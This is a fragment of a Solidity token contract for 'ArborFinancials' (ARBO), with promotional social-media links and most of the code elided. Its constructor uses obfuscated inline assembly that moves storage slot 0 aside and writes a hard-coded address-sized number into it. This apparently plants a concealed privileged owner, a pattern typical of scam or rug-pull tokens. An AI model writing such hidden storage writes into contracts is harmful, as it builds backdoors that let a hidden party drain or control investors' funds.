/*
Welcome to ArborFinancials.

Telegram: https://t.me/ArborFinancials/
Twitter: https://twitter.com/ArborFinancials/
Website: https://ArborFinancials.io
...
contract ArborFinancials {
    string public constant name = "ArborFinancials";
    string public constant symbol = "ARBO";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1217627887151984954090965993512108714698807908953, 1))}
